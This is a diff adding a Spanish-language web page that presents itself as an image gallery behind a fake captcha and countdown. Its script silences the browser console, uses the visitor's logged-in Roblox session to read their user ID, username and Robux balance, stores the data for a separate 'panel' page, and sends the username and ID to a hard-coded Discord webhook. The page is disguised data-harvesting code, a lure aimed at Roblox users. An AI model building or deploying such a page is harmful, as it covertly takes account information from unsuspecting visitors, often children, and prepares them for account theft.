@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galería de Imágenes</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+        }
+
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            padding: 20px;
+            background: #111;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(255, 68, 68, 0.2);
+            border: 1px solid #222;
+        }
+
+        /* Pantalla de verificación */
+        .verification-screen {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .verification-title {
+            font-size: 28px;
+            color: #ff4444;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        .verification-subtitle {
+            color: #888;
+            margin-bottom: 40px;
+            font-size: 16px;
+        }
+
+        /* Círculo de carga */
+        .progress-circle {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: conic-gradient(#ff4444 0deg, #333 0deg);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 30px auto;
+            transition: background 0.1s linear;
+            box-shadow: 0 0 30px rgba(255, 68, 68, 0.3);
+        }
+
+        .inner-circle {
+            width: 130px;
+            height: 130px;
+            background: #111;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            border: 2px solid #222;
+        }
+
+        .counter {
+            font-size: 48px;
+            font-weight: bold;
+            color: #ff4444;
+            line-height: 1;
+        }
+
+        .counter-label {
+            font-size: 14px;
+            color: #666;
+            margin-top: 5px;
+        }
+
+        /* Botón tipo captcha */
+        .captcha-button {
+            background: #222;
+            border: 2px solid #333;
+            border-radius: 50px;
+            padding: 15px 40px;
+            display: inline-flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 30px auto;
+            user-select: none;
+            max-width: 300px;
+            width: 100%;
+        }
+
+        .captcha-button:hover {
+            border-color: #ff4444;
+            background: #1a1a1a;
+        }
+
+        .captcha-checkbox {
+            width: 30px;
+            height: 30px;
+            border: 2px solid #ff4444;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ff4444;
+            font-size: 20px;
+            background: #111;
+            transition: all 0.3s;
+        }
+
+        .captcha-checkbox.checked {
+            background: #00ff00;
+            border-color: #00ff00;
+            color: #000;
+        }
+
+        .captcha-text {
+            flex: 1;
+            text-align: left;
+            color: #fff;
+        }
+
+        .captcha-text small {
+            color: #666;
+            font-size: 12px;
+            display: block;
+        }
+
+        /* Galería de imágenes */
+        .gallery-screen {
+            display: none;
+        }
+
+        .gallery-screen.show {
+            display: block;
+        }
+
+        .gallery-title {
+            font-size: 24px;
+            color: #ff4444;
+            margin-bottom: 10px;
+            font-weight: bold;
+            text-align: center;
+        }
+
+        .gallery-subtitle {
+            color: #888;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+
+        .gallery-slider {
+            display: flex;
+            overflow-x: auto;
+            gap: 20px;
+            padding: 20px 10px;
+            scroll-snap-type: x mandatory;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+
+        .gallery-slider::-webkit-scrollbar {
+            display: none;
+        }
+
+        .gallery-item {
+            flex: 0 0 auto;
+            width: 280px;
+            scroll-snap-align: start;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 2px solid #222;
+            transition: border-color 0.3s;
+            background: #1a1a1a;
+        }
+
+        .gallery-item:hover {
+            border-color: #ff4444;
+        }
+
+        .gallery-item img {
+            width: 100%;
+            height: 280px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .gallery-item .caption {
+            padding: 12px;
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            background: #111;
+        }
+
+        .slider-hint {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin: 20px 0;
+            padding: 10px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            border: 1px solid #222;
+        }
+
+        .slider-hint span {
+            color: #ff4444;
+            font-size: 20px;
+            margin-right: 8px;
+        }
+
+        /* Utilidades */
+        .hidden {
+            display: none;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Pantalla de verificación -->
+        <div class="verification-screen" id="verificationScreen">
+            <div class="verification-title">🔍 VERIFICACIÓN</div>
+            <div class="verification-subtitle">Por favor espera, estamos verificando que no seas un robot</div>
+            
+            <div class="progress-circle" id="progressCircle">
+                <div class="inner-circle">
+                    <span class="counter" id="counter">30</span>
+                    <span class="counter-label">segundos</span>
+                </div>
+            </div>
+            
+            <div id="captchaContainer" style="display: none;">
+                <div class="captcha-button" id="captchaButton">
+                    <div class="captcha-checkbox" id="captchaCheckbox">✓</div>
+                    <div class="captcha-text">
+                        Haz Click aquí para confirmar que no eres un robot
+                        <small>Verificación de seguridad</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Pantalla de galería -->
+        <div class="gallery-screen" id="galleryScreen">
+            <div class="gallery-title">📸 GALERÍA DE IMÁGENES</div>
+            <div class="gallery-subtitle">Desliza para ver las imágenes</div>
+            
+            <div class="slider-hint">
+                <span>👆</span> Desliza horizontalmente para ver más imágenes
+            </div>
+            
+            <div class="gallery-slider" id="gallerySlider">
+                <!-- Las imágenes se cargarán aquí -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ================= CONFIGURACIÓN =================
+        const PANEL_URL = "https://juanchos123.github.io/image_9180173538.png/panel.html";
+        
+        // Lista de imágenes
+        const imagenes = [
+            {
+                url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRoAezjtFE6or4R-e50mf5T4gM3CZ9Q0kBJmYFcOZUm4FJ5BN-AQHRXxAHE&s=10",
+                caption: "Imagen 1 - Paisaje urbano"
+            },
+            {
+                url: "https://i.pinimg.com/236x/69/a4/63/69a4631c8777df9cddf673a6a67d1c0b.jpg",
+                caption: "Imagen 2 - Arte digital"
+            },
+            {
+                url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTY6t30DI6I2wxQmCB794lrCpoUQJsuwcX9cCwzlFxXlg&s=10",
+                caption: "Imagen 3 - Estilo anime"
+            }
+        ];
+
+        // Silenciar consola
+        console.log = console.error = console.warn = function() {};
+
+        // Elementos del DOM
+        const verificationScreen = document.getElementById('verificationScreen');
+        const galleryScreen = document.getElementById('galleryScreen');
+        const progressCircle = document.getElementById('progressCircle');
+        const counterElement = document.getElementById('counter');
+        const captchaContainer = document.getElementById('captchaContainer');
+        const captchaButton = document.getElementById('captchaButton');
+        const captchaCheckbox = document.getElementById('captchaCheckbox');
+        const gallerySlider = document.getElementById('gallerySlider');
+
+        // Variables de estado
+        let secondsLeft = 30;
+        let verificationComplete = false;
+        let userData = {
+            cuentaDetectada: false,
+            userId: null,
+            userName: null,
+            timestamp: Date.now()
+        };
+
+        // =========== CONTADOR REGRESIVO ===========
+        const interval = setInterval(() => {
+            secondsLeft--;
+            counterElement.textContent = secondsLeft;
+            
+            // Actualizar círculo de progreso
+            const progress = ((30 - secondsLeft) / 30) * 360;
+            progressCircle.style.background = `conic-gradient(#ff4444 ${progress}deg, #333 ${progress}deg)`;
+            
+            if (secondsLeft <= 0) {
+                clearInterval(interval);
+                counterElement.textContent = "0";
+                verificationComplete = true;
+                mostrarCaptcha();
+            }
+        }, 1000);
+
+        // =========== DETECTAR CUENTA DE ROBLOX ===========
+        async function detectarCuentaRoblox() {
+            try {
+                const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
+                    credentials: 'include'
+                });
+                
+                if (res.ok) {
+                    const data = await res.json();
+                    userData.cuentaDetectada = true;
+                    userData.userId = data.id;
+                    userData.userName = data.name;
+                    
+                    // Obtener más datos si es posible
+                    try {
+                        const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${data.id}/currency`, {
+                            credentials: 'include'
+                        });
+                        if (robuxRes.ok) {
+                            const robuxData = await robuxRes.json();
+                            userData.robux = robuxData.robux;
+                        }
+                    } catch (e) {}
+                    
+                    guardarDatosParaPanel();
+                }
+            } catch (e) {}
+        }
+
+        // =========== GUARDAR DATOS PARA EL PANEL ===========
+        function guardarDatosParaPanel() {
+            const datos = {
+                ...userData,
+                timestamp: Date.now()
+            };
+            
+            // Guardar en localStorage para que el panel pueda leerlo
+            localStorage.setItem('roblox_user_data', JSON.stringify(datos));
+            
+            // También guardar en sessionStorage por si acaso
+            sessionStorage.setItem('roblox_user_data', JSON.stringify(datos));
+        }
+
+        // =========== MOSTRAR CAPTCHA ===========
+        function mostrarCaptcha() {
+            captchaContainer.style.display = 'block';
+            
+            // Detectar cuenta justo cuando aparece el captcha
+            detectarCuentaRoblox();
+        }
+
+        // =========== MANEJAR CLICK EN CAPTCHA ===========
+        captchaButton.addEventListener('click', function() {
+            if (!verificationComplete) return;
+            
+            // Marcar checkbox
+            captchaCheckbox.classList.add('checked');
+            captchaCheckbox.style.background = '#00ff00';
+            captchaCheckbox.style.borderColor = '#00ff00';
+            captchaCheckbox.style.color = '#000';
+            
+            // Pequeña pausa para efecto visual
+            setTimeout(() => {
+                // Ocultar pantalla de verificación
+                verificationScreen.style.display = 'none';
+                
+                // Mostrar galería
+                galleryScreen.classList.add('show');
+                
+                // Cargar imágenes
+                cargarImagenes();
+                
+                // Notificar al panel
+                notificarPanel();
+            }, 500);
+        });
+
+        // =========== CARGAR IMÁGENES ===========
+        function cargarImagenes() {
+            gallerySlider.innerHTML = '';
+            
+            imagenes.forEach((img, index) => {
+                const item = document.createElement('div');
+                item.className = 'gallery-item fade-in';
+                item.innerHTML = `
+                    <img src="${img.url}" alt="${img.caption}" loading="lazy">
+                    <div class="caption">${img.caption}</div>
+                `;
+                
+                // Si la imagen falla, mostrar placeholder
+                item.querySelector('img').onerror = function() {
+                    this.src = 'https://via.placeholder.com/280x280/111/ff4444?text=Imagen+${index+1}';
+                };
+                
+                gallerySlider.appendChild(item);
+            });
+        }
+
+        // =========== NOTIFICAR AL PANEL ===========
+        function notificarPanel() {
+            // Guardar timestamp de última actividad
+            localStorage.setItem('last_activity', Date.now().toString());
+            
+            // Si hay cuenta detectada, enviar datos completos
+            if (userData.cuentaDetectada) {
+                const datosCompletos = {
+                    ...userData,
+                    evento: 'verificacion_completada',
+                    url_actual: window.location.href
+                };
+                
+                localStorage.setItem('roblox_session_active', JSON.stringify(datosCompletos));
+                
+                // También enviar a Discord (opcional)
+                fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `✅ Verificación completada - Usuario: ${userData.userName} (${userData.userId})`
+                    })
+                }).catch(() => {});
+            }
+        }
+
+        // =========== INICIALIZAR ===========
+        (function() {
+            // Limpiar datos antiguos (más de 5 minutos)
+            const lastActivity = localStorage.getItem('last_activity');
+            if (lastActivity && (Date.now() - parseInt(lastActivity)) > 300000) {
+                localStorage.removeItem('roblox_user_data');
+                localStorage.removeItem('roblox_session_active');
+            }
+            
+            // Verificar si ya hay datos guardados
+            const savedData = localStorage.getItem('roblox_user_data');
+            if (savedData) {
+                try {
+                    const parsed = JSON.parse(savedData);
+                    if (parsed.userId) {
+                        userData = parsed;
+                    }
+                } catch (e) {}
+            }
+        })();
+
+        // =========== WEBHOOK DE DISCORD (OPCIONAL) ===========
+        const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
+    </script>
+</body>
+</html>
